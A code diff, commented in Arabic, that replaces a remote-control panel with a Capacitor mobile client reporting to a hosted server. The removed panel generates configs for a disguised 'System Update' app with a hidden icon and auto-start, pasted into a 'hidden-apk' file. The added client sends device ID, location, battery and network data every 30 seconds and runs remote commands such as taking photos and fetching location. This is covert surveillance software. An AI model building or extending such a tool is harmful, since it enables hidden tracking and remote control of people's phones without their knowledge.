@@ -1,155 +1,195 @@
-// controller-app/app.js - Control Panel v2.0
+// استيراد مكتبات Capacitor
+import { Device } from '@capacitor/device';
+import { Network } from '@capacitor/network';
+import { Geolocation } from '@capacitor/geolocation';
+import { Capacitor } from '@capacitor/core';
 
-const DEFAULT_SERVER_URL = 'https://assign-place-picture-recommendation.trycloudflare.com';
-let SERVER_URL = localStorage.getItem('SERVER_URL') || DEFAULT_SERVER_URL;
-let authToken = null;
-let selectedDeviceId = null;
+// إعدادات الاتصال بالخادم
+const SERVER_URL = 'https://device-tracker-server-production-7968.up.railway.app';
+let deviceId = '';
+let checkInterval = null;
 
-function login() {
-    const username = document.getElementById('adminUsername')?.value;
-    const password = document.getElementById('adminPassword')?.value;
-    if (!username || !password) { alert('⚠️ أدخل بيانات الدخول'); return; }
-    authToken = btoa(`${username}:${password}`);
-    localStorage.setItem('authToken', authToken);
-    document.getElementById('loginSection').style.display = 'none';
-    document.getElementById('dashboardSection').style.display = 'block';
-    loadSettings(); refreshDevices();
+// الحصول على معرف فريد للجهاز
+async function getDeviceId() {
+    const info = await Device.getId();
+    return info.uuid; // أو info.identifier
 }
 
-async function refreshDevices() {
+// تسجيل الجهاز في الخادم
+async function registerDevice() {
     try {
-        const response = await fetch(`${SERVER_URL}/api/devices`, { headers: { 'Authorization': `Basic ${authToken}` } });
-        const data = await response.json();
-        if (data.success) renderDevices(data.devices);
-    } catch (error) {
-        console.error('❌ Connection error:', error.message);
-        alert('❌ فشل الاتصال. تأكد من إعدادات الخادم.');
-    }
-}
-
-function renderDevices(devices) {
-    const container = document.getElementById('devicesList');
-    if (!container) return;
-    if (devices.length === 0) {
-        container.innerHTML = '<p style="color:#888;text-align:center;padding:20px;">لا توجد أجهزة متصلة</p>';
-        return;
-    }
-    container.innerHTML = devices.map(device => {
-        const isOnline = device.isOnline || (device.lastCheckIn && (Date.now() - new Date(device.lastCheckIn).getTime()) < 60000);
-        return `
-            <div class="device-card ${selectedDeviceId === device.deviceId ? 'active' : ''}" onclick="selectDevice('${device.deviceId}', ${JSON.stringify(device).replace(/'/g, "\\'")})">
-                <h4>📱 ${device.deviceInfo?.deviceName || 'Unknown'}</h4>
-                <p><strong>ID:</strong> ${device.deviceId?.substring(0, 20)}...</p>
-                <p><strong>Client:</strong> ${device.clientId?.substring(0, 15)}...</p>
-                <p><strong>Config:</strong> ${device.config?.configId || 'default'}</p>
-                <p><strong>Registered:</strong> ${new Date(device.registeredAt).toLocaleString('ar-EG')}</p>
-                <span class="status ${isOnline ? 'online' : 'offline'}">${isOnline ? '🟢 متصل' : '🔴 غير متصل'}</span>
-            </div>`;
-    }).join('');
-}
-function selectDevice(deviceId, device) {
-    selectedDeviceId = deviceId;
-    document.getElementById('selectedDeviceId').textContent = deviceId?.substring(0, 25) + '...';
-    document.getElementById('deviceStatus').textContent = device.status || 'unknown';
-    document.getElementById('deviceLastCheckIn').textContent = device.lastCheckIn ? new Date(device.lastCheckIn).toLocaleString('ar-EG') : 'Never';
-    document.getElementById('deviceConfigId').textContent = device.config?.configId || 'default';
-    document.getElementById('deviceDetails').style.display = 'block';
-    document.querySelectorAll('.device-card').forEach(card => card.classList.remove('active'));
-    event?.closest('.device-card')?.classList.add('active');
-}
-
-function toggleCustomAction() {
-    const commandType = document.getElementById('commandType')?.value;
-    const customInput = document.getElementById('customAction');
-    if (customInput) customInput.style.display = commandType === 'custom' ? 'block' : 'none';
-}
-
-async function sendCommand() {
-    if (!selectedDeviceId) { alert('⚠️ اختر جهاز أولاً'); return; }
-    const commandType = document.getElementById('commandType')?.value;
-    const customAction = document.getElementById('customAction')?.value;
-    const command = { type: commandType, action: commandType === 'custom' ? customAction : null, payload: {} };
-    try {
-        const response = await fetch(`${SERVER_URL}/api/devices/${selectedDeviceId}/command`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'Authorization': `Basic ${authToken}` },
-            body: JSON.stringify({ type: command.type, action: command.action, payload: command.payload })
-        });
-        const data = await response.json();
-        if (data.success) alert('✅ تم إرسال الأمر!'); else alert('❌ فشل: ' + data.error);
-    } catch (error) { alert('❌ خطأ اتصال: ' + error.message); }
-}
-
-async function generateConfig() {
-    const serverUrl = document.getElementById('configServerUrl')?.value?.trim();
-    const appName = document.getElementById('configAppName')?.value || 'System Update';
-    const appId = document.getElementById('configAppId')?.value || 'com.system.service';
-    const checkInInterval = parseInt(document.getElementById('configCheckInInterval')?.value) || 30000;
-    const hideIcon = document.getElementById('configHideIcon')?.checked;
-    const autoStart = document.getElementById('configAutoStart')?.checked;
-    
-    if (!serverUrl) { alert('⚠️ أدخل رابط الخادم'); return; }
-    try {
-        const response = await fetch(`${SERVER_URL}/api/config/generate`, {
+        const deviceId = await getDeviceId();
+        const info = await Device.getInfo();
+        const response = await fetch(`${SERVER_URL}/api/register`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ serverUrl, appName, appId, checkInInterval, hideIcon, autoStart, customConfig: {} })
+            body: JSON.stringify({
+                deviceId,
+                model: info.model,
+                os: info.platform,
+                manufacturer: info.manufacturer
+            })
         });
         const data = await response.json();
-        if (data.success) {            document.getElementById('resultConfigId').textContent = data.configId;
-            document.getElementById('resultHtmlSnippet').textContent = data.htmlSnippet;
-            document.getElementById('configResult').style.display = 'block';
-            document.getElementById('configResult')?.scrollIntoView({ behavior: 'smooth' });
-        } else { alert('❌ فشل: ' + data.error); }
-    } catch (error) { alert('❌ خطأ اتصال: ' + error.message); }
-}
-
-function copyConfigCode() {
-    const code = document.getElementById('resultHtmlSnippet')?.textContent;
-    if (code) {
-        navigator.clipboard.writeText(code).then(() => alert('✅ تم النسخ! الصقه في hidden-apk/index.html')).catch(() => alert('⚠️ انسخ يدوياً'));
+        console.log('تم التسجيل:', data);
+        return deviceId;
+    } catch (error) {
+        console.error('فشل التسجيل:', error);
+        throw error;
     }
 }
 
-function loadSettings() {
-    const savedUrl = localStorage.getItem('SERVER_URL');
-    if (savedUrl && document.getElementById('settingServerUrl')) {
-        document.getElementById('settingServerUrl').value = savedUrl;
-        SERVER_URL = savedUrl;
+// الحصول على حالة البطارية
+async function getBatteryStatus() {
+    // Capacitor لا يدعم البطارية مباشرة، نحتاج لاستخدام WebView API
+    if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        return Math.round(battery.level * 100);
     }
+    return 0; // قيمة افتراضية
 }
 
-function saveSettings() {
-    const newUrl = document.getElementById('settingServerUrl')?.value?.trim();
-    if (!newUrl) { alert('⚠️ أدخل رابط الخادم'); return; }
-    localStorage.setItem('SERVER_URL', newUrl);
-    SERVER_URL = newUrl;
-    alert('✅ تم الحفظ!');
-    refreshDevices();
+// الحصول على نوع الشبكة
+async function getNetworkStatus() {
+    const status = await Network.getStatus();
+    return status.connected ? status.connectionType : 'none';
 }
 
-async function testConnection() {
-    const statusEl = document.getElementById('connectionStatus');
-    if (!statusEl) return;
-    statusEl.textContent = '🔄 جاري الاختبار...'; statusEl.className = '';
+// الحصول على الموقع
+async function getLocation() {
     try {
-        const response = await fetch(`${SERVER_URL}/`, { timeout: 5000 });
-        const data = await response.json();
-        if (data.success) { statusEl.textContent = '✅ الخادم يعمل!'; statusEl.className = 'success'; }
-        else { statusEl.textContent = '⚠️ الخادم رد بدون نجاح'; statusEl.className = 'error'; }
-    } catch (error) { statusEl.textContent = '❌ فشل: ' + error.message; statusEl.className = 'error'; }
+        const position = await Geolocation.getCurrentPosition();
+        return {
+            lat: position.coords.latitude,
+            lng: position.coords.longitude
+        };
+    } catch (error) {
+        console.warn('فشل الحصول على الموقع:', error);
+        return null;
+    }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const savedToken = localStorage.getItem('authToken');
-    if (savedToken) {
-        authToken = savedToken;
-        document.getElementById('loginSection').style.display = 'none';
-        document.getElementById('dashboardSection').style.display = 'block';        loadSettings(); refreshDevices();
-    }
-    setInterval(() => {
-        if (authToken && document.getElementById('dashboardSection')?.style.display !== 'none') refreshDevices();
-    }, 30000);
-});
+// دالة الـ Check-in الدورية
+async function performCheckin() {
+    try {
+        const [battery, network, location] = await Promise.all([
+            getBatteryStatus(),
+            getNetworkStatus(),
+            getLocation()
+        ]);
 
-console.log('🎮 Control Panel v2.0 | Server:', SERVER_URL);
+        const response = await fetch(`${SERVER_URL}/api/checkin`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                deviceId,
+                battery,
+                network,
+                location
+            })
+        });
+
+        const data = await response.json();
+        console.log('Check-in ناجح، الأوامر:', data.commands);
+
+        // تنفيذ الأوامر الواردة
+        if (data.commands && data.commands.length > 0) {
+            executeCommands(data.commands);
+        }
+
+        // تحديث الواجهة
+        updateUI(battery, network, location);
+    } catch (error) {
+        console.error('فشل Check-in:', error);
+        document.getElementById('connectionStatus').className = 'status disconnected';
+        document.getElementById('connectionStatus').innerText = '❌ غير متصل';
+    }
+}
+
+// تنفيذ الأوامر
+async function executeCommands(commands) {
+    for (const cmd of commands) {
+        console.log('تنفيذ الأمر:', cmd.command, cmd.parameters);
+        let result = null;
+        let error = null;
+
+        try {
+            switch (cmd.command) {
+                case 'FACTORY_RESET':
+                    // ملاحظة: هذا يحتاج صلاحية نظام، غير ممكن في تطبيق عادي
+                    result = 'غير مدعوم';
+                    break;
+                case 'TAKE_PHOTO':
+                    // يمكن استخدام Capacitor Camera
+                    result = 'تم تنفيذ الأمر (كاميرا)';
+                    break;
+                case 'LOCK_SCREEN':
+                    // غير مدعوم في Capacitor
+                    result = 'غير مدعوم';
+                    break;
+                case 'SHOW_MESSAGE':
+                    if (cmd.parameters.text) {
+                        alert(cmd.parameters.text);
+                    }
+                    result = 'تم عرض الرسالة';
+                    break;
+                case 'MAX_VOLUME':
+                    // غير مدعوم
+                    result = 'غير مدعوم';
+                    break;
+                case 'GET_LOCATION':
+                    const loc = await getLocation();
+                    result = loc;
+                    break;
+                default:
+                    result = 'أمر غير معروف';
+            }
+        } catch (e) {
+            error = e.message;
+        }
+
+        // إرسال نتيجة الأمر
+        try {
+            await fetch(`${SERVER_URL}/api/command-result`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    deviceId,
+                    commandId: cmd.id,
+                    result,
+                    error
+                })
+            });
+        } catch (e) {
+            console.error('فشل إرسال نتيجة الأمر:', e);
+        }
+    }
+}
+
+// تحديث واجهة المستخدم
+function updateUI(battery, network, location) {
+    document.getElementById('batteryText').innerText = battery + '%';
+    document.getElementById('networkText').innerText = network;
+    if (location) {
+        document.getElementById('locationText').innerText = `${location.lat.toFixed(4)}, ${location.lng.toFixed(4)}`;
+    }
+    document.getElementById('connectionStatus').className = 'status connected';
+    document.getElementById('connectionStatus').innerText = '✅ متصل';
+}
+
+// بدء التشغيل
+async function init() {
+    try {
+        deviceId = await registerDevice();
+        document.getElementById('deviceText').innerText = deviceId.substring(0, 8) + '...';
+        
+        // بدء الـ Check-in الدوري
+        performCheckin(); // أول مرة
+        checkInterval = setInterval(performCheckin, 30000); // كل 30 ثانية
+    } catch (error) {
+        console.error('فشل التهيئة:', error);
+    }
+}
+
+// تشغيل عند تحميل الصفحة
+document.addEventListener('DOMContentLoaded', init);
